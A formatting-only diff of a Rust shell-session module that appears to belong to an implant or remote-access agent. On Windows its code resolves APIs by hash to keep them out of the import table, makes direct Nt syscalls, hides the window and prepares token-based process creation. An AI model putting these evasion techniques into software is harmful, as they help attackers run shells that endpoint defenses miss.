@@ -170,9 +170,7 @@ pub fn create_shell(
     shell_path: Option<&str>,
     out_tx: Sender<Message>,
 ) -> Result<ShellInfo, String> {
-    let shell_type = shell_path
-        .unwrap_or_else(|| default_shell())
-        .to_string();
+    let shell_type = shell_path.unwrap_or_else(|| default_shell()).to_string();
 
     let (process, pipes) = spawn_shell_process(&shell_type)?;
 
@@ -183,7 +181,9 @@ pub fn create_shell(
     let stop_flag = std::sync::Arc::new(AtomicBool::new(false));
 
     {
-        let mut mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
+        let mut mgr = manager()
+            .lock()
+            .map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
         session_id = mgr.next_id;
         mgr.next_id += 1;
 
@@ -197,7 +197,10 @@ pub fn create_shell(
         // child exit.  On Windows the handle is a kernel object reference (not
         // duplicated); we only use it for non-blocking NtWaitForSingleObject.
         #[cfg(windows)]
-        let child_for_reader = PlatformProcess { handle: process.handle, pid: process.pid };
+        let child_for_reader = PlatformProcess {
+            handle: process.handle,
+            pid: process.pid,
+        };
         #[cfg(unix)]
         let child_for_reader = PlatformProcess { pid: process.pid };
         #[cfg(not(any(windows, unix)))]
@@ -250,7 +253,9 @@ pub fn create_shell(
 ///
 /// Appends a newline if the input doesn't already end with one.
 pub fn send_input(session_id: u32, data: &str) -> Result<(), String> {
-    let mut mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
+    let mut mgr = manager()
+        .lock()
+        .map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
     let session = mgr
         .sessions
         .get_mut(&session_id)
@@ -274,7 +279,9 @@ pub fn send_input(session_id: u32, data: &str) -> Result<(), String> {
 
 /// Close and clean up a shell session.
 pub fn close_shell(session_id: u32) -> Result<String, String> {
-    let mut mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
+    let mut mgr = manager()
+        .lock()
+        .map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
     let mut session = mgr
         .sessions
         .remove(&session_id)
@@ -301,7 +308,9 @@ pub fn close_shell(session_id: u32) -> Result<String, String> {
 
 /// List all active shell sessions.
 pub fn list_shells() -> Result<Vec<ShellInfo>, String> {
-    let mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
+    let mgr = manager()
+        .lock()
+        .map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
     let mut list = Vec::new();
     for (_, session) in &mgr.sessions {
         list.push(ShellInfo {
@@ -316,7 +325,9 @@ pub fn list_shells() -> Result<Vec<ShellInfo>, String> {
 
 /// Resize the terminal for a session (PTY on Unix, no-op on Windows cmd.exe).
 pub fn resize_shell(session_id: u32, _cols: u16, _rows: u16) -> Result<String, String> {
-    let mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
+    let mgr = manager()
+        .lock()
+        .map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
     let session = mgr
         .sessions
         .get(&session_id)
@@ -372,11 +383,9 @@ fn default_shell() -> &'static str {
 // ── Windows implementation ──────────────────────────────────────────────────
 
 #[cfg(windows)]
-fn spawn_shell_process(
-    shell_path: &str,
-) -> Result<(PlatformProcess, PlatformPipes), String> {
+fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPipes), String> {
     use winapi::shared::minwindef::{DWORD, TRUE};
-    
+
     use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
     use winapi::um::winbase::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES};
     use winapi::um::winnt::HANDLE;
@@ -386,23 +395,22 @@ fn spawn_shell_process(
         .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
 
     // CreatePipe — used for stdin/stdout/stderr pipes
-    let create_pipe_addr = unsafe { pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"CreatePipe\0"),
-    ) }.ok_or_else(|| "could not resolve CreatePipe".to_string())?;
+    let create_pipe_addr =
+        unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreatePipe\0")) }
+            .ok_or_else(|| "could not resolve CreatePipe".to_string())?;
     type CreatePipeFn = unsafe extern "system" fn(
-        *mut winapi::shared::ntdef::HANDLE,  // hReadPipe
-        *mut winapi::shared::ntdef::HANDLE,  // hWritePipe
+        *mut winapi::shared::ntdef::HANDLE,               // hReadPipe
+        *mut winapi::shared::ntdef::HANDLE,               // hWritePipe
         *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
-        DWORD,                               // nSize
+        DWORD,                                            // nSize
     ) -> i32; // BOOL
     let create_pipe: CreatePipeFn = unsafe { std::mem::transmute(create_pipe_addr) };
 
     // CreateProcessW — used to spawn the shell process
-    let create_process_w_addr = unsafe { pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"CreateProcessW\0"),
-    ) }.ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
+    let create_process_w_addr = unsafe {
+        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0"))
+    }
+    .ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
     type CreateProcessWFn = unsafe extern "system" fn(
         *mut u16,                 // lpApplicationName
         *mut u16,                 // lpCommandLine
@@ -418,26 +426,31 @@ fn spawn_shell_process(
     let create_process_w: CreateProcessWFn = unsafe { std::mem::transmute(create_process_w_addr) };
 
     // CreateProcessWithTokenW — from advapi32 (no pre-computed hash)
-    let advapi32 = unsafe { pe_resolve::get_module_handle_by_hash(
-        pe_resolve::hash_str(b"advapi32.dll\0")
-    ) }.unwrap_or(0);
-    let create_process_with_token_w: Option<unsafe extern "system" fn(
-        *mut c_void,              // hToken
-        u32,                      // dwLogonFlags
-        *mut u16,                 // lpApplicationName
-        *mut u16,                 // lpCommandLine
-        u32,                      // dwCreationFlags
-        *mut c_void,              // lpEnvironment
-        *mut u16,                 // lpCurrentDirectory
-        *mut STARTUPINFOW,        // lpStartupInfo
-        *mut PROCESS_INFORMATION, // lpProcessInformation
-    ) -> i32> = if advapi32 == 0 {
+    let advapi32 =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) }
+            .unwrap_or(0);
+    let create_process_with_token_w: Option<
+        unsafe extern "system" fn(
+            *mut c_void,              // hToken
+            u32,                      // dwLogonFlags
+            *mut u16,                 // lpApplicationName
+            *mut u16,                 // lpCommandLine
+            u32,                      // dwCreationFlags
+            *mut c_void,              // lpEnvironment
+            *mut u16,                 // lpCurrentDirectory
+            *mut STARTUPINFOW,        // lpStartupInfo
+            *mut PROCESS_INFORMATION, // lpProcessInformation
+        ) -> i32,
+    > = if advapi32 == 0 {
         None
     } else {
-        unsafe { pe_resolve::get_proc_address_by_hash(
-            advapi32,
-            pe_resolve::hash_str(b"CreateProcessWithTokenW\0"),
-        ) }.map(|addr| unsafe { std::mem::transmute(addr) })
+        unsafe {
+            pe_resolve::get_proc_address_by_hash(
+                advapi32,
+                pe_resolve::hash_str(b"CreateProcessWithTokenW\0"),
+            )
+        }
+        .map(|addr| unsafe { std::mem::transmute(addr) })
     };
 
     use std::ffi::OsStr;
@@ -480,22 +493,28 @@ fn spawn_shell_process(
             inherit: u8,
             protect_from_close: u8,
         }
-        let flag_off = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
+        let flag_off = ObjHandleFlagInfo {
+            inherit: 0,
+            protect_from_close: 0,
+        };
         let _ = crate::syscall!(
             "NtSetInformationObject",
-            stdin_write as u64, 4u64,
+            stdin_write as u64,
+            4u64,
             &flag_off as *const _ as u64,
             std::mem::size_of::<ObjHandleFlagInfo>() as u64,
         );
         let _ = crate::syscall!(
             "NtSetInformationObject",
-            stdout_read as u64, 4u64,
+            stdout_read as u64,
+            4u64,
             &flag_off as *const _ as u64,
             std::mem::size_of::<ObjHandleFlagInfo>() as u64,
         );
         let _ = crate::syscall!(
             "NtSetInformationObject",
-            stderr_read as u64, 4u64,
+            stderr_read as u64,
+            4u64,
             &flag_off as *const _ as u64,
             std::mem::size_of::<ObjHandleFlagInfo>() as u64,
         );
@@ -559,7 +578,14 @@ fn spawn_shell_process(
             };
             if result == 0 {
                 let err = unsafe { get_last_error() };
-                close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
+                close_all_handles(
+                    stdin_read,
+                    stdin_write,
+                    stdout_read,
+                    stdout_write,
+                    stderr_read,
+                    stderr_write,
+                );
                 return Err(format!("CreateProcessW failed: error {err}"));
             }
             true
@@ -584,14 +610,28 @@ fn spawn_shell_process(
         };
         if result == 0 {
             let err = unsafe { get_last_error() };
-            close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
+            close_all_handles(
+                stdin_read,
+                stdin_write,
+                stdout_read,
+                stdout_write,
+                stderr_read,
+                stderr_write,
+            );
             return Err(format!("CreateProcessW failed: error {err}"));
         }
         true
     };
 
     if !creation_result {
-        close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
+        close_all_handles(
+            stdin_read,
+            stdin_write,
+            stdout_read,
+            stdout_write,
+            stderr_read,
+            stderr_write,
+        );
         return Err("CreateProcess failed".to_string());
     }
 
@@ -663,10 +703,9 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
     // Dynamically resolve WriteFile from kernel32 to avoid IAT entry.
     let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
         .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
-    let write_file_addr = unsafe {
-        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"WriteFile\0"))
-    }
-    .ok_or_else(|| "could not resolve WriteFile".to_string())?;
+    let write_file_addr =
+        unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"WriteFile\0")) }
+            .ok_or_else(|| "could not resolve WriteFile".to_string())?;
     type WriteFileFn = unsafe extern "system" fn(
         winapi::shared::ntdef::HANDLE, // hFile
         *const c_void,                 // lpBuffer
@@ -713,9 +752,8 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
     ) -> i32; // BOOL
     let peek_named_pipe: PeekNamedPipeFn = unsafe { std::mem::transmute(peek_named_pipe_addr) };
 
-    let read_file_addr = unsafe {
-        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"ReadFile\0"))
-    }?;
+    let read_file_addr =
+        unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"ReadFile\0")) }?;
     type ReadFileFn = unsafe extern "system" fn(
         winapi::shared::ntdef::HANDLE, // hFile
         *mut c_void,                   // lpBuffer
@@ -789,8 +827,8 @@ fn is_process_alive(process: &PlatformProcess) -> bool {
         let mut timeout: i64 = 0; // Non-blocking: return immediately with current state
         let status = crate::syscall!(
             "NtWaitForSingleObject",
-            process.handle as u64,  // Handle
-            0u64,                    // Alertable = FALSE
+            process.handle as u64,         // Handle
+            0u64,                          // Alertable = FALSE
             &mut timeout as *mut _ as u64, // Timeout (relative, -100ns)
         );
         // STATUS_SUCCESS (0) = WAIT_OBJECT_0 = signaled (process exited)
@@ -805,9 +843,7 @@ fn is_process_alive(process: &PlatformProcess) -> bool {
 // ── Unix implementation ─────────────────────────────────────────────────────
 
 #[cfg(unix)]
-fn spawn_shell_process(
-    shell_path: &str,
-) -> Result<(PlatformProcess, PlatformPipes), String> {
+fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPipes), String> {
     // ── PTY-based shell spawn ─────────────────────────────────────────
     // Allocate a PTY pair so the child gets a proper controlling terminal
     // with full terminal emulation (colour, line editing, resize, etc.).
@@ -815,7 +851,10 @@ fn spawn_shell_process(
     // Open the PTY master.
     let master_fd = unsafe { libc::posix_openpt(libc::O_RDWR | libc::O_NOCTTY) };
     if master_fd < 0 {
-        return Err(format!("posix_openpt() failed: {}", std::io::Error::last_os_error()));
+        return Err(format!(
+            "posix_openpt() failed: {}",
+            std::io::Error::last_os_error()
+        ));
     }
 
     // Grant access to the slave (chown to the current user).
@@ -837,7 +876,10 @@ fn spawn_shell_process(
         let ptr = libc::ptsname(master_fd);
         if ptr.is_null() {
             close_fd(master_fd);
-            return Err(format!("ptsname() failed: {}", std::io::Error::last_os_error()));
+            return Err(format!(
+                "ptsname() failed: {}",
+                std::io::Error::last_os_error()
+            ));
         }
         std::ffi::CStr::from_ptr(ptr).to_owned()
     };
@@ -857,10 +899,7 @@ fn spawn_shell_process(
                 // Open the slave PTY.  O_NOCTTY prevents the open() itself
                 // from assigning a controlling terminal; login_tty() below
                 // handles that explicitly via TIOCSCTTY.
-                let slave_fd = libc::open(
-                    slave_name.as_ptr(),
-                    libc::O_RDWR | libc::O_NOCTTY,
-                );
+                let slave_fd = libc::open(slave_name.as_ptr(), libc::O_RDWR | libc::O_NOCTTY);
                 if slave_fd < 0 {
                     libc::_exit(1);
                 }
@@ -907,9 +946,8 @@ fn close_fd(fd: i32) {
 
 #[cfg(unix)]
 fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
-    let result = unsafe {
-        libc::write(pipes.master_fd, data.as_ptr() as *const c_void, data.len())
-    };
+    let result =
+        unsafe { libc::write(pipes.master_fd, data.as_ptr() as *const c_void, data.len()) };
     if result < 0 {
         Err(format!(
             "write to PTY master failed: {}",
@@ -922,7 +960,6 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
 
 #[cfg(unix)]
 fn read_from_pipe(fd: i32) -> Option<Vec<u8>> {
-
     // Use poll() to check for available data.
     let mut pfd = libc::pollfd {
         fd,
@@ -970,9 +1007,7 @@ fn resize_pty(session: &ShellSession, cols: u16, rows: u16) -> Result<(), String
     let mut winsize: libc::winsize = unsafe { std::mem::zeroed() };
     winsize.ws_col = cols;
     winsize.ws_row = rows;
-    let result = unsafe {
-        libc::ioctl(session.pipes.master_fd, libc::TIOCSWINSZ, &winsize)
-    };
+    let result = unsafe { libc::ioctl(session.pipes.master_fd, libc::TIOCSWINSZ, &winsize) };
     if result < 0 {
         return Err(format!(
             "ioctl(TIOCSWINSZ) failed for session {}: {}",
@@ -1057,7 +1092,14 @@ fn spawn_readers(
 
     #[cfg(not(any(windows, unix)))]
     {
-        let _ = (session_id, pipes, out_tx, pause_flag, stop_flag, child_process);
+        let _ = (
+            session_id,
+            pipes,
+            out_tx,
+            pause_flag,
+            stop_flag,
+            child_process,
+        );
     }
 
     // We'll use a single thread that polls both stdout and stderr.
@@ -1108,7 +1150,8 @@ fn spawn_readers(
                     // Read from stderr (Windows only — PTY merges into master_fd on Unix).
                     #[cfg(windows)]
                     {
-                        let stderr_data = read_from_pipe(stderr_handle as winapi::shared::ntdef::HANDLE);
+                        let stderr_data =
+                            read_from_pipe(stderr_handle as winapi::shared::ntdef::HANDLE);
 
                         if let Some(data) = stderr_data {
                             let text = String::from_utf8_lossy(&data).to_string();
